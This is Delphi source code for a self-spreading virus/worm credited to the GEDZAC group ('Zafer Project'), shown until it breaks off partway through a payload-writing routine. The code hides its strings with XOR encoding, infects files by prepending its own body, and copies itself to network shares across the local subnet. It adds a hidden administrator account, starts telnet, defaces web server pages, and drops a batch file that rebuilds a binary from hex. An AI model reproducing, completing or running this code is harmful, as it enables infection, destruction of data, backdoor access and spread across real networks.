   program zaferA;

   {$APPTYPE CONSOLE}

   uses
     Windows,
     SysUtils,
     Registry,
     Classes,
     Wininet,
     FileCtrl,
     Winsock,
     TLHelp32;

   CONST
    CRLF = #13#10;
    Version = '1.0';
     MySize = 194560 ;
     ku = #189;
     Name = 'Zafer Project';
     Objectives = 'Test 1';
     Author = 'Byt3Cr0w/GEDZAC';
   var
       badword:array[1..20] of string;
       fp2:array[1..15] of string;
       g:array[1..50] of string;
     IQX,WEBSERVERx,zafx,zaf,txe,txdx,temp,vxe,vxx,ich,gez,ged,isthe,who,url,urlp,suspect,hcu,hlm,x38,x83,x3b,mnx,xum,Pro,pes,ped,pes2,ped2,plex,Oe,Od,YyY,YyX: string;
     shit,O,URLx,URLq,SearchingFor,Pedofilic,WebServ,WindowsX,Points,KeY,PEDOman,WEBman,Stupid:integer;
     bw1,bw2,bw3,bw4,bw5,bw6,bw7,bw8,bw9,bw10,bw11,bw12,bw13,bw14,bw15,bw16,bw17,bw18,bw19,bw20:string;
   bd1,bd2,bd3,bd4,bd5,bd6,bd7,bd8,bd9,bd10,bd11,bd12,bd13,bd14,bd15,bd16,bd17,bd18,bd19,bd20:string;
   leer,ine,ine2,ine3,de,de2,de3,eine,eine2,eine3,ede,ede2,ede3:string;
     Control,peer2peer:integer;
     ia,tt,qq: textfile;
     f1,f2,f2x,f2xx,f3,f4,f5,f6,f7,f8,f9,f10,f11,f12,f13,f14,f15:string;
     hushx,kushx,hush,kush,codex1,codex,codexx,codex2:string;
     ThreadID:dword;
     a,asx:string;
       pass:integer;
     whox:string;
   who2,what:integer;


      procedure UuU;
    var oxo:string;
        xcvx,ash,cxc:integer;
        xx,xxx,y:integer;
       mu:string;
    begin
    xcvx := 53;
    oxo := 'lZ@VTXP\[AZXLY\SPB\A]Z@ATF\[RYPA]\[R8?|RTCP\[AZLZ@GBTLFW@ALZ@YPSAXPB\A][ZA]\[R8?|CPR\CP[\[AZFX\YPF|CPQPTYAB\A]TYYLZ@GRTXPF8?|B\F]LZ@GP]TEEL' + CRLF +
           '[ZB|]TQAZYPALZ@B\[8?8?b]LQZ[ALZ@RPAA]PS@V^Z@AZSXLSTVP[ZB8?b]LQZ[ALZ@RPAA]PS@V^Z@AZSXLSTVP[ZB8?8?|[A]PFPTZSY\SPLZ@GP_@FATX\[[ZB8?lZ' + CRLF +
           '@Y\CPLZ@GY\SP\[FPV@GP8?|SPPYA]PET\[ZSLZ@G[PPQYPF8?tFA]PLF]\A\[AZXLX\[Q8?8?|FVGPTXB\A]Z@ATFZ@[Q8?}ZBVZ@YQLZ@AT^PTBTLPCPGLA]\[RA]TA|BTF' + CRLF +
           '8?yPTCPXPTS@V^\[FYTCP8?lZ@GSTVPA]TA|QPFE\FP8?lZ@G]PTGA\[F\QPA]TAFRGTL8?|VTXPAZQTLAZFTLLZ@GPS@V^PQ\[PCPGLBTL8?8?|[A]PFPTZSY\SPLZ@GP_@FA' + CRLF +
           'TX\[[ZB8?lZ@Y\CPLZ@GY\SP\[FPV@GP8?|SPPYA]PET\[ZSLZ@G[PPQYPF8?tFA]PLF]\A\[AZXLX\[Q8?lZ@FAZYPXLY\SPB\A]Z@ATF\R[8?lZ@F@V^PQXPQGL8?';
    ash := strLen(Pchar (oxo));
    for cxc := 1 to ash do begin
    mnx := mnx + chr(ord(oxo[cxc]) xor xcvx);
    end;
    xum := mnx;
    xx := strLen(Pchar (xum));
   y := xx - 794;
   KeY := y;
    end;

   Function x(things:string):string;
   var newx:string;
       LlL,OoO,theKey:integer;
   begin
   theKey := KeY;
   LlL := strLen(PChar(things));
   For OoO := 1 to LlL do begin
   newx := newx + chr(ord(things[OoO]) xor thekey);
   end;
   x := newx;
   end;

    function TerminateProcess(hProcess: THandle; uExitCode: LongWord): LongBOOL; stdcall; external 'kernel32.dll' name 'TerminateProcess';
   function OpenProcess(dwDesiredAccess: LongWORD; bInheritHandle: LongBOOL; dwProcessId: LongWORD): THandle; stdcall; external 'kernel32.dll' name 'OpenProcess';
   function CloseHandle(hObject: THandle): LongBOOL; stdcall; external 'kernel32.dll' name 'CloseHandle';
   function extractfname(fil:string):string;
   begin
    while pos('\',fil)<>0 do delete(fil,1,pos('\',fil));
    extractfname:=fil;
   end;

   function Kill(ExeFileName: string): integer;
    var
    ContinueLoop: LongBool;
    FSnapshotHandle: THandle;
    FProcessEntry32: TProcessEntry32;
    begin
    result := 0;
    FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
    ContinueLoop := Process32First(FSnapshotHandle,FProcessEntry32);
    while integer(ContinueLoop) <> 0 do
    begin
    if ExtractfName(FProcessEntry32.szExeFile) = ExeFileName
    {or FProcessEntry32.szExeFile = ExeFileName} then
    Result := Integer(TerminateProcess(OpenProcess($0001, LongBOOL(0),FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle,FProcessEntry32);
    end;
    CloseHandle(FSnapshotHandle);
    end;


   function folder():string;
   var winfol:pChar;
   begin
   GetMem(winfol,100);
   if GetSystemDirectory(winfol,100) <> 0 then
   begin
     folder := winfol + '\';
   end;
   FreeMem(winfol,100);
   end;


   procedure Xx21();
   var popo:array[1..MySize] of char;
   vic:String;
   suck: TProcessInformation;
   rere: TStartupInfo;
   laf,oxo,Oyo:integer;
   bcg,ann:File;
   begin
   Randomize;
   vic := folder+temp+inttostr(Random(3000))+ vxx; Copyfile(Pchar(ParamStr(0)),PChar(ParamStr(0) + vxx),false);
   AssignFile(bcg,ParamStr(0) + vxx); Reset(bcg,1); AssignFile(ann,vic); Rewrite(ann,1); Seek(bcg,MySize);
   repeat
   BlockRead(bcg, popo, SizeOf(popo), laf); BlockWrite(ann, popo, laf, oxo);
   until (laf = 0) or (oxo <> laf);
   Close(bcg); Close(ann);
   CreateProcessA(Pchar(vic),NIL,nil, nil, False, 0, nil, nil, rere, suck);
   end;

   procedure OBXgs(ssx:string);
   var thezafer,hum, now:File;
   letro,nefer:integer;
   xxxx:array[1..MySize] of Char;
   begin
   if fileexists(ssx) then begin
   AssignFile(thezafer,folder + isthe); Reset(thezafer,1); AssignFile(hum,ssx);
   Reset(hum,1); AssignFile(now,ssx+gez); ReWrite(now,1);
   Repeat
   BlockRead(thezafer,xxxx,Sizeof(xxxx),letro); BlockWrite(now,xxxx,letro,nefer);
   Until (letro = 0) or (nefer <> letro);
   Repeat
   BlockRead(hum,xxxx,sizeof(xxxx),letro); BlockWrite(now,xxxx,letro,nefer);
   Until (letro = 0) or (nefer <> letro);
   BlockWrite(now,'Zafer',6); CloseFile(now); CloseFile(hum); CloseFile(thezafer); Copyfile(pchar(ssx+isthe),pchar(ssx),false);
   Deletefile(pchar(ssx+isthe));
   end;
   end;


   function xmux(oper:string):boolean;
   var perdido:array[1..MySize] of Char;
   po,gol,q:integer;
   mark:string;
   ju,eso:file;
   begin
   FileMode:=2;
   {$I-}
   AssignFile(eso, oper); Reset(eso, 1); CloseFile(eso);
   {$I+}
   q := IOResult; FileMode := 0 ;
   if q = 5 + 6 - 11 then
   begin
   AssignFile(ju,oper); reset(ju,1); Seek(ju,FileSize(ju) -6); BlockRead(ju,perdido,sizeof(perdido),gol);
   For po := 1 to sizeof(perdido) do begin mark := mark + perdido[po]
   end;
   if pchar(mark) = zaf then begin
   xmux := True;
   end
   ELSE
   begin
   xmux := false
   end;
   closefile(ju);
   end
   ELSE
   begin
   Result := false;
   end;
   end;

   procedure deads(rip:string);
   var aja:TSearchRec;
   begin
   FindFirst(rip +x('cZGZ'),faArchive+faHidden,aja);
   if xmux(rip+'\'+aja.name) = false then
   begin
   OBXgs(rip+'\'+aja.name);
   end;
   While FindNext(aja) = 0 do begin
   if xmux(rip+'\'+aja.name) = false then
   begin
   OBXgs(rip+'\'+aja.name);
   end;
   end;
   end;

   procedure bacteria(rip:string);
   var pekax:TSearchRec;
   begin
   FindFirst(rip + '\.*',faDirectory,pekax); deads(rip +'\'+pekax.Name) ;
   While FindNext(pekax) = 0 do
   begin
   if pekax.name <> '..' then
   begin
   deads(rip +'\'+pekax.Name);
   end;
   end;
   end;

     function SearchForWord(const Filex: string ;const Word: string):integer;

     const
       Bufer = 9999;
     var
       River  : TFileStream;
       HomeDepot    : String;  //:)
       Tox      : integer;
       wait      : boolean;
       px   : integer;
     begin
       SetLength(HomeDepot, Bufer);
       River:=TFileStream.Create(Filex,fmOpenRead OR fmShareDenyWrite);
       Result:=-1;
       try
         River.Seek(0,soFromBeginning);
         wait:=FALSE;
         repeat

           px:=River.Position;
           wait:= ( River.Read(HomeDepot[1],bufer) < bufer );
           Tox:=Pos(Word, HomeDepot);

           If Tox <> 0 then begin
             Result:=Tox+px;
             wait:=TRUE;
           end else begin
             River.Seek(Length(Word),soFromCurrent);
           end;
         until wait;
       finally
         River.Free;
       end;

              end;


     function SearchForPedofilic( sUrl: string): string;
   type
     tbuffer    = array[0..7000] of char;
      pbuffer = ^tbuffer;
   var
     buffer     : pBuffer;
     a          : cardinal;
     ihConnect,
     ihSession,
     iDocument  : HINTERNET;
   begin
   Result:='NoNoNoNoNoNo';
     ihConnect:=InternetOpen('GEDZAC',  LOCAL_INTERNET_ACCESS, '', '', 0);
     iDocument:=InternetOpenURL(ihConnect, pChar(sUrl), NIL, 1, INTERNET_FLAG_RELOAD or INTERNET_FLAG_DONT_CACHE or INTERNET_FLAG_RAW_DATA, 0);
     if iDocument<>nil then try
       New(buffer);
       InternetReadFile(iDocument, Buffer, sizeof(TBuffer), a);
        Result:=pchar(buffer);
     finally
       internetCloseHandle(iDocument);
       Dispose(buffer);
       InternetCloseHandle(ihConnect);
     end;
   end;


   Function XMsh(Llave : HKEY; ruta,llavex:string): string;
   VAR
     Reg:TRegistry;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKeyReadOnly(ruta) Then
      Result := Reg.ReadString(llavex);
   End;

   Function XxO(Llave : HKEY; ruta,llavex,valor:string):string;
   VAR
     Reg:TRegistry ;
    Begin
      Reg := TRegistry.Create;
      Reg.RootKey := Llave;
      IF Reg.OpenKey(ruta,true) Then
      Reg.WriteString(llavex,valor);
   End;



   function CheckURL:integer;
   var
   X1,BC,PedoPoints :integer;
   urlz:textfile;
   tue,tud,ja,jad,ufx,ufd,tuy,tuex,tudx,uew,uewx,OoxX:string;
   begin
   tuex := 'c|PQLPSZc'; tudx := x(tuex); uew := 'yPQK}JYYZM'; uewx := x(uew);
   tuy := XMsh(HKEY_CURRENT_USER,tudx,uewx);
   if tuy  <> '' then PedoPoints := strtoint(tuy) else PedoPoints := 0;
   URLq := 0;
   ufx := '|cJMSIG['; ufd := x(ufx);
   bw1 := 'OMPLKVKJ\VPQVQY^QKVS'; bw2 := 'LZGP\PQRZQPMZL'; bw3 := 'QVÎ^L[ZLQJ[^L'; bw4 := 'QVÎPL[ZLQJ[^L';
   bw5 := 'LZGPVSZX^S'; bw6 := 'QVÎPLKZQVZQ[PLZGP'; bw7 := 'LZGP\PQQVÎPL'; bw8 := 'LZGP\PQQVÎ^L';
   bw9 := 'YPKPLQVÎ^L[ZLQJ[^L'; bw10 := 'YPKPLQVÎPL[ZLQJ[PL'; bw11 := 'LZGP\PQ'; bw12 := 'IV[ZPL[ZRZQPMZL[ZLQJ[PL';
   bw13 := 'IV[ZPL[ZQVÎ^L[ZLQJ[^L'; bw14 := 'IV[ZPL[ZQVÎPL[ZLQJ[PL'; bw15 := 'OJK^LRZQPMZL'; bw16 := 'OMPLKVKJK^LRZQPMZL';
   bw17 := 'QVÎ^LOMPLKVKJK^L'; bw18 := 'LZGHWVKTV[L'; bw19 := 'TV[LQ^TZ['; bw20 := 'L\WPPSXVMSLQ^TZ[';
   tue := 'clpykh~mzcrV\MPLPYKcvQKZMQZKzGOSPMZMckFOZ[jmsL'; ja := 'JMS'; tud := x(tue); jad := x(ja);
   bd1 := x(bw1); bd2 := x(bw2); bd3 := x(bw3); bd4 := x(bw4); bd5 := x(bw5); bd6 := x(bw6); bd7 := x(bw7);
   bd8 := x(bw8); bd9 := x(bw9); bd10 := x(bw10); bd11 := x(bw11); bd12 := x(bw12); bd13 := x(bw13);
   bd14 := x(bw14); bd15 := x(bw15); bd16 := x(bw16); bd17 := x(bw17); bd18 := x(bw18); bd19 := x(bw19); bd20 := x(bw20);
   For X1 := 1 to 20 do
   Begin
   URLp := inttostr(X1);
   url := XMsh(HKEY_CURRENT_USER,tud,jad+URLP);
   suspect := SearchForPedofilic(url);
   badword[1] := bd1; badword[2] := bd2; badword[3] := bd3; badword[4] := bd4; badword[5] := bd5; badword[6] := bd6; badword[7] := bd7; badword[8] := bd8;
   badword[9] := bd9; badword[10] := bd10; badword[11] := bd11; badword[12] := bd12; badword[13] := bd13; badword[14] := bd14; badword[15] := bd15;
   badword[16] := bd16; badword[17] := bd17; badword[18] := bd18; badword[19] := bd19; badword[20] := bd20;
   AssignFile(urlz,ufd);
   rewrite(urlz);
   writeln(urlz,suspect);
   closefile(urlz);
   For BC := 1 to 20 do  Begin
   SearchingFor:=SearchForWord(ufd,badword[BC]);
   if SearchingFor <>-1 then Pedofilic := PedoPoints + 1;
   end;
   end;
   OoXX := inttostr(Pedofilic);
   xXO(HKEY_CURRENT_USER,tudx,uewx,OoXX);
   end;


   function CheckWWW:integer;
   begin
   ine := '|cVQZKOJ]cHHHMPPKcVQ[ZGWKR'; ine2 := '|cVQZKOJ]cHHHMPPKcVQ[ZGWKRS';
   ine3 := '|cVQZKOJ]cHHHMPPKcVQ[ZGOWO'; de := '|cVQZKOJ]cHHHMPPKc{ZY^JSKWKR';
   de2 := '|cVQZKOJ]cHHHMPPKc{ZY^JSKWKRS'; de3 := '|cVQZKOJ]cHHHMPPKc{ZY^JSKOWO';
   eine := x(ine);eine2 := x(ine2); eine3 := x(ine3); ede := x(de); ede2 := x(de2); ede3 := x(de3);
   if fileexists(eine) then WebServ := 1; if fileexists(eine2) then WebServ := 1; if fileexists(eine3) then WebServ := 1;
   if fileexists(ede) then WebServ := 1; if fileexists(ede2) then WebServ := 1; if fileexists(ede3) then WebServ := 1;
   end;


    function WhereIam:string;
      begin
        case Win32Platform of
          VER_PLATFORM_WIN32s:
            Result:='old';
          VER_PLATFORM_WIN32_WINDOWS:
            Result:='old';
          VER_PLATFORM_WIN32_NT:
              Result:='new';
        end;
      end;


      function CheckWindows:integer;
      begin
      if WhereIam = 'old' then Windowsx := 1 else Windowsx := 0;
      end;

      function CheckIQ:integer;
      var
   XM,IX,PX,NX,N2X,zx,MX,AX,SX,PAX,GX,KX: string;
   ke,we,de,ge,le,me,goe,oe,xe,re,ms,ies,run,zle,mpl,kmp,swe,sek,gk,kek,smk,nfk,nfk2,avm:string;
   pge,psk,nes,gfs,kik,Kerio,WinMX,donkey,gnucles,lime,morpheus,grokster,overnet,XoloX,Rapigator:string;
   x1a,x2a,x3a,x4a,x5a,x6a,x7a,x8a,x9a,x10a,x1b,x2b,x4b,x5b,x6b,x7b,x8b,x9b,x10b,x11a:string;
   esx,eset,stx,stealther,nmx,nmap,dex,delphi,wsx,wsearch,lvx,lava,tsx,tasm,dvx,dev:string;
      begin
      Points := 15;
      wsx := '|c~M\WVIPL[ZOMPXM^R^chWZQjlZ^M\W'; wsearch := x(wsx);
      lvx := '|c~M\WVIPL[ZOMPXM^R^cs^I^LPYK'; lava := x(lvx);
      tsx := '|cK^LR'; tasm := x(tsx);
      dvx := '|c{ZI|OO'; dev := x(dvx);
      esx := '|c~M\WVIPL[ZOMPXM^R^czlzk'; eset := x(esx); stx := '|c~M\WVIPL[ZOMPXM^R^clKZ^SKWZM';
      stealther := x(stx); nmx := '|c~M\WVIPL[ZOMPXM^R^cqr^OhVQ'; nmap := x(nmx);
      dex := '|c~M\WVIPL[ZOMPXM^R^c}PMS^Q['; delphi := x(dex);
      ke := Pro + 'ctZMVPcoZMLPQ^SyVMZH^SS'; we := Pro + 'chVQrg'; de := Pro + 'cZ[PQTZF';
      ge := Pro + 'cXQJ\SZJL'; le := Pro + 'cSVRZHVMZ'; me := Pro + 'cRPMOWZJL';
      goe := Pro + 'cxMPTLKZM'; oe := Pro + 'cpIZMQZK'; xe := Pro + 'cgPSPg'; re := Pro + 'cm^OVX^KPM';
      ms := 'clPYKH^MZcrV\MPLPYKcrlqrZLLZQXZMc'; ies := 'clPYKH^MZcrV\MPLPYKcvQKZMQZKzGOSPMZMc';
      run := 'clPYKH^MZcrV\MPLPYKchVQ[PHLc|JMMZQKiZMLVPQcmJQc'; zle := 'clPYKH^MZcePQZs^]LcePQZ~S^MRc';
      mpl := 'clPYKH^MZco^K\WPJcrLXoSJLc'; kmp := 'clPYKH^MZcrV\MPLPYKczG\W^QXZc|SVZQKczGKZQLVPQLc';
      swe := 'clPYKH^MZclOFH^MZ}S^LKZMclZKKVQXLc'; sek := 'clPYKH^MZclFR^QKZ\c||o{s|ctLKPMZcc]cc';
      gk := 'clPYKH^MZcxyvcsqlllc'; kek := 'clPYKH^MZct^E^^c';
      smk := 'lZMIZM'; nfk := 'qPMKPQ~QKVIVMJL~i'; nfk2 := 'v\NqZK'; avm := '~ior^VS|WZ\TZM';
      pge := 'oxooSJXVQ'; psk := 'oMPGFlZKKVQXL'; nes := 'tZF'; gfs := 'o^KW'; kik := 'RF`VO`^[[MZLL';
      Kerio := x(ke); WinMX := x(we); donkey := x(de); gnucles := x(ge); lime := x(le); morpheus := x(me);
      grokster := x(goe); overnet := x(oe); XoloX := x(xe); Rapigator := x(re);
      x1a := x(smk); x2a := x(nfk); x3a := x(nfk2); x4a := x(avm); x5a := x(pge);
      x6a := x(psk); x8a := x(nes); x9a := x(gfs); x10a := x(kik);
      x1b := x(ms); x2b := x(ies); x3b := x(run); x4b := x(zle); x5b := x(mpl); x6b := x(kmp); x7b := x(swe);
      x8b := x(sek); x9b := x(gk); x38 := x(hcu); x83 := x(hlm);
      XM := XMsh(HKEY_CURRENT_USER,x1b,x1a);  if XM <> '' then Points := Points - 1;
      IX := XMsh(HKEY_CURRENT_USER,x2b,x2a); if XM <> '' then Points := Points - 1;
      NX := XMsh(HKEY_LOCAL_MACHINE,x3b,x3a); if NX <> '' then Points := Points - 2;
      N2X := XMsh(HKEY_LOCAL_MACHINE,x3b,x4b); if N2X <> '' then Points := Points - 2;
      ZX := XMsh(HKEY_CURRENT_USER,x4b,x5a); if XM <> '' then Points := Points + 1;
      MX := XMsh(HKEY_CURRENT_USER,x5b,x6a); if MX <> '' then Points := Points - 1;
      AX := XMsh(HKEY_LOCAL_MACHINE,x5b,x7a); if AX <> '' then Points := Points + 1;
      PX := XMsh(HKEY_LOCAL_MACHINE,x6b,x7a); if PX <> '' then Points := Points + 2;
      SX := XMsh(HKEY_LOCAL_MACHINE,x7b,x8a); if SX <> '' then Points := Points + 1;
      PAX := XMsh(HKEY_LOCAL_MACHINE,x8b,x9a); if PAX <> '' then Points := Points + 1;
      GX := XMsh(HKEY_LOCAL_MACHINE,x9b,x10a); if GX <> '' then Points := Points + 1;
      KX := XMsh(HKEY_LOCAL_MACHINE,x10b,x11a); if KX <> '' then Points := Points - 1;
      if DirectoryExists(Kerio) then Points := Points + 1; if DirectoryExists(winMX) then Points := Points - 1;
      if DirectoryExists(donkey) then Points := Points - 1; if DirectoryExists(gnucles) then Points := Points - 1;
      if DirectoryExists(lime) then Points := Points - 1; if DirectoryExists(morpheus) then Points := Points - 1;
      if DirectoryExists(Grokster) then Points := Points - 1; if DirectoryExists(overnet) then Points := Points - 1;
      if DirectoryExists(Xolox) then Points := Points - 1; if DirectoryExists(Rapigator) then Points := Points - 1;
      if DirectoryExists(ESET) then Points := Points + 1; if DirectoryExists(wsearch) then Points := Points - 1;
      if DirectoryExists(Stealther) then Points := Points + 1; if DirectoryExists(Lava) then Points := Points + 1;
      if DirectoryExists(nmap) then Points := Points + 1; if DirectoryExists(tasm) then Points := Points + 1;
      if DirectoryExists(delphi) then Points := Points + 1; if DirectoryExists(dev) then Points := Points - 1;
      end;


   function msg1:integer;
     var ec,dec,ce,ced:string;
         decx,cedx:Pchar;
     begin
     ec := 'de^YZM~vKZLKb'; dec := x(ec);
     ce := 'e^YZM]F}FK|MHxz{e~|'; ced := x(ce);
     decx := Pchar(dec);
     cedx := Pchar(ced);
     messagebox(0,decx,cedx,32);
     end;


   function net:integer;
   VAR  n1,n2,n3,n4,n5:string;
     NetDrivers:Char;
     u:Integer;
     siu:String;
     N:Array[1..5] of string;
     MaxNetPathLen:DWord;
     Begin
     n1 := 'c'; n2 := 'c{P\JRZQKL^Q[lZKKVQXLc~SSjLZMLclK^MKrZQJcoMPXM^RLclK^MKJOc';
     n3 := 'chvq{phlclK^MKrZQJcoMPXM^RLclK^MKJOc'; n4 := 'chvq{phlcrZQÅVQV\VPcoMPXM^R^LcvQV\VPc';
     n5 := 'chvqqkcoMPYVSZLc~SSjLZMLclK^MKrZQJcoMPXM^RLclK^MKJOc';
   n[1] := x(n1); n[2] := x(n2); n[3] := x(n3); n[4] := x(n4); n[5] := x(n5);
       MaxNetPathLen:=MAX_PATH;
       SetLength(siu,MAX_PATH);
       For NetDrivers := 'A' to 'Z' Do
       If WNetGetConnection(PChar(''+NetDrivers+':'),PChar(siu),
       MaxNetPathLen)<>ERROR_NOT_CONNECTED then
       For u := 1 to 5 Do
     Begin
     CopyFile(PChar(who),PChar(NetDrivers+':'+n[u]+'winstart.bat'),true);
      end;
      end;


   function zafer:integer;
   var ex,ex2:string;
   die:integer;
   mid:textfile;
   begin
   if Windowsx = 1 then
   begin
   ex := ' z|wppyy25\POFHVQ[PHLczGOSPMZMZGZHVQ[PHLcLFL`O^\TZGZ25{zsHVQ[PHLczGOSPMZMZGZ25\POFHVQ[PHLcHVQLWZSSZGZHVQ[PHLczGOSPMZMZGZ';
   ex2 := x(ex);
   AssignFile(mid,x('|c^JKPZGZ\]^K'));
   rewrite(mid); writeln(mid,ex2); closefile(mid);
   SystemParametersInfo( SPI_SCREENSAVERRUNNING, 1, @die, 0);
   end
   else
   begin
   WinExec(PChar('cmd.exe /c net user Zafer Zafer /add'),SW_HIDE);
   WinExec(PChar('cmd.exe /c net localgroup "Administrators" Zafer /add'),SW_HIDE);
   WinExec(PChar('cmd.exe /c net start "telnet"'),SW_HIDE);
   Xxo(HKEY_CURRENT_USER,x('lPYKH^MZcrV\MPLPYKchVQ[PHLc|JMMZQKiZMLVPQcoPSV\VZLclFLKZRc'),x('{VL^]SZk^LTrXM'),x(''));
   end;
    end;

   function MainServer:integer;
   var wfx:Array [1..6] of string;
   X2,X3,X4,BC2,mad:integer;
   u1,ud,ud2,udx,upp: string;
   pe:textfile;
   begin
   upp := x('|cVQZKOJ]cHHHMPPKcGM^[V^KZGZ');
   u1 := x('WKRS25WZ^[25RZK^WKKOZNJVI\PQKZQKKZGKWKRS\W^MLZKVLP25KVKSZxz{e~|s~}lKVKSZ25') + CRLF +
         ' <style type="text/css">' + CRLF +
         ' <!-- ' + CRLF +
         ' body { ' + CRLF +
         '     background-color: #000000;   ' + CRLF +
         ' }' + CRLF +
         ' .dead {   ' + CRLF +
         '     font-family: Geneva, Arial, Helvetica, sans-serif;  ' + CRLF +
         '     font-size: 14px;   ' + CRLF + x('25\PSPMyy25') + CRLF +
         ' }'  + CRLF +
         ' .dead {'  + CRLF +
         '     font-size: 36px; '  + CRLF +
         '     color: #0066FF;  '  + CRLF +
         '     font-family: "Times New Roman", Times, serif; '  + CRLF +
         ' }'  + CRLF +
         ' --> '  + CRLF +
         ' </style></head>  '  + CRLF +
         ' <body>'  + CRLF +
         ' <p><strong><span class="dead">___________________________________________________________________________________________________________________________</span></strong></p>'  + CRLF +
         ' <p class="death"><span class="dead2"> [&quot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;' +
         '&middot;&middot;*-~GEDZAC LABS 2004~-*&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;&middot;' +
         '&middot;&middot;&middot;&middot;&quot;]</span></p>'  + CRLF +
         ' <p><strong><span class="dead">___________________________________________________________________________________________________________________________</span></strong></p>'  + CRLF +
         ' <p>&nbsp;</p> '  + CRLF +
         ' <p><strong>....................................................................................You may pray for your soul................................................................................................................. </strong></p> '  + CRLF +
         ' </body> '  + CRLF + X('6WKRS');

   ud  := '6KVKSZfPJQZZ[gM^[V^KKVKSZ256LKFSZKFOZKZGK\LL256256]P[FD2566]^\TXMPJQ[\PSPMyyyyyy256B256[Z^[D2566YPQKY^RVSFxZQZI^~MV^SwZSIZKV\^L^QLLZMVY2566Y' + CRLF +
          'PQKLVEZOG2566\PSPMyy256B256[Z^[D2566YPQKLVEZ    OG2566\PSPM       yy2566YPQKY^RVSFkVRZLqZHmPR^QkVRZLLZMVY256B256' + CRLF;
   ud2 := ']P[F25OhZS\PRZKPPJMQZHHZ]LVKZO25OKPLZZPJMQZHLKJYYFPJQZZ[gM^[V^KOSJXVQO25O^SVXQ\ZQKZM^WMZYGM^[V^KZGZWKKOHHHRV\MPLPYK\PR[PHQSP^' + CRLF +
          '[LGM^[V^K^O25]P[F256WKRS25';
   udx := x('6WKRS256WZ^[25') + '<meta http-equiv="." content="text/html; charset=iso-8859-1"> ' + CRLF + x(ud) + '</style><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"></head>' + x(ud2);
   wfx[1] := eine; wfx[2] := eine2; wfx[3] := eine3; wfx[4] := ede; wfx[5] := ede2; wfx[6] := ede3;
   For X2 := 1 to 6 do
   Begin
   For BC2 := 1 to 20 do  Begin
   SearchingFor:=SearchForWord(wfx[X2],badword[BC2]);
   if SearchingFor <>-1 then mad := 1;
   end;
   end;
   if mad = 1 then
   begin
   for X3 := 1 to 6 do begin
   deletefile(pchar(wfx[X3]));
   AssignFile(pe,wfx[X3]); rewrite(pe); writeln(pe,u1); closefile(pe);
   end;
   end else begin
   Copyfile(Pchar(who),Pchar(upp),true);
   for X4 := 1 to 6 do begin
   deletefile(pchar(wfx[X3]));
   AssignFile(pe,wfx[X3]); rewrite(pe); writeln(pe,udx); closefile(pe);
   end;
   end;
   end;



   Function disk:integer;
   var dw1,dw2,dw3,dwx1,dwx2,endx:string;
   oop:integer;
   dis:array[1..3] of string;
   label neverend;
   begin
   neverend:
   begin
   dw1 := '{VL\P[Z'; dwx1 := '~'; dw2 := ''; dwx2 := 'ySPOOF~'; dw3 := '{VL\P[Z'; endx := '~cyPMfPJOVY';
   dis[1] := x(dw1)+ku+x(dwx1); dis[2] := x(dw2)+ku+x(dwx2); dis[3] := x(dw3)+ku;
   For oop := 1 to 3 do begin
   if FindWindow(nil,PChar(dis[oop])) <> 0 then
   begin
   CopyFile(PChar(who),pchar(x(endx)),false);
   end;
   end;
   sleep(5000);
   goto neverend;
   end;
   end;

   Function Biosis(machine:string):integer;
   var
   Net: TNetResource;
   begin
   Net.dwType := RESOURCETYPE_DISK; Net.lpLocalName := 'O:'; Net.lpRemoteName := pchar('\\'+Machine+'\c');
   Net.lpProvider := ''; WNetAddConnection2(Net, '', '', CONNECT_UPDATE_PROFILE);
   end;

   Function WakeUp:integer;
   var
   WVersionRequested : WORD;
   WsaData : TWSAData;
   begin
   WVersionRequested := MAKEWORD(2, 2);
   if WSAStartup(wVersionRequested, WsaData)> 0 then
   begin
   shit := 1;
   end;
   end;

   Function coffe:String;
   var Host: PHostEnt;
   money : array[0..128] of char;
   bed : pchar;
   begin
   GetHostName(@money, 128); Host := GetHostByName(@money); bed := Inet_Ntoa(PinAddr(Host^.h_addr_list^)^);
   Result:=bed;
   end;

   Function nigth(room:string):integer;
   var
   iwanttosleep,rigthnow:String;
   iback,tomorrow,infew,minutesigotosleep:integer; //i want to sleep rigth now i back tomorrow in few minutes i go
   begin                                          //to my bed :)
   if shit <> 0 then
   begin
   minutesigotosleep:=0; iwanttosleep:=coffe; infew:=strlen(pchar(iwanttosleep));
   For iback := 1 to infew do
   begin
   if iwanttosleep[iback]='.' then inc(minutesigotosleep);
   if minutesigotosleep < 3 then
   begin
   rigthnow := rigthnow+iwanttosleep[iback];
   end;
   For tomorrow := 0 to 255 do
   Begin
   Biosis(rigthnow+'.'+inttostr(tomorrow)); CopyFile(pchar(who),Pchar('O:\clean_service.cmd'),true);
   if fileexists(hush) then
   begin
   Assignfile(qq,hush); rewrite(qq); writeln(qq,codex1); closefile(qq);
   end;
   if fileexists(kush) then
   begin
   Assignfile(tt,kush); rewrite(tt); writeln(tt,codex2); closefile(tt);
   end;
   WNetCancelConnection2( 'O:',0,TRUE)
   end;
   WSACleanup;
   End;
   end;
   end;

   function payload:integer;
   var a,az:string;
       qup:textfile;
   begin
   a := 'E^YZM]^K'; az := folder + x(a);
   Assignfile(qup,az);
   rewrite(qup);
   writeln(qup,'@ECHO OFF');
   writeln(qup,'echo e 0100  4D 5A 42 01 1B 00 01 00 02 00 AC 01 FF FF 0D 04>>zafer');
   writeln(qup,'echo e 0110  00 02 00 00 00 00 00 00 1C 00 00 00 09 00 51 03>>zafer');
   writeln(qup,'echo e 0120  B9 66 1A BE CA 34 89 F7 1E A9 B5 80 8C C8 05 05>>zafer');
   writeln(qup,'echo e 0130  00 8E D8 05 C4 00 8E C0 FD F3 A5 FC 2E 80 6C 12>>zafer');
   writeln(qup,'echo e 0140  10 73 E7 92 AF AD 0E 0E 06 1F 07 16 BD 0F 00 BB>>zafer');
   writeln(qup,'echo e 0150  EF 80 55 CB 00 55 50 58 21 0B 03 03 08 96 95 46>>zafer');
